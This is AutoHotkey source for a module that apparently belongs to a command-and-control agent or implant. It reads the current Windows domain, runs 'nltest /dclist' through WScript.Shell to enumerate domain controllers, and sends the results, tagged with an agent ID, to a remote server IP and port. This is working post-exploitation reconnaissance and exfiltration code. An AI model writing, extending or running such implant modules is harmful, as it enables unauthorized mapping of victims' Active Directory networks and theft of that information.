; ============================================================================
; ENUMERATE DOMAIN CONTROLLERS MODULE
; ============================================================================
; Lists all domain controllers in the current domain
; ============================================================================

EnumerateDCs() {
    ; Get the domain name
    domain := EnvGet("USERDOMAIN")
    if (domain == "") {
        message := Format("command_output|{}|Could not retrieve domain name from USERDOMAIN", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
        return
    }

    ; Build and execute the command
    comspec := EnvGet("ComSpec")
    cmd := comspec . " /c nltest /dclist:" . domain

    try {
        ; Execute command and capture output
        shell := ComObject("WScript.Shell")
        exec := shell.Exec(cmd)
        output := exec.StdOut.ReadAll()

        ; Format the data with header
        data := "Domain Controllers for " . domain . ":`n"
        data .= "----------------------------------------`n"
        data .= output

        ; Send results to server
        message := Format("command_output|{}|{}", this.agentID, data)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

    } catch Error as err {
        errorMsg := "Error enumerating DCs: " . err.Message
        message := Format("command_output|{}|{}", this.agentID, errorMsg)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }
}
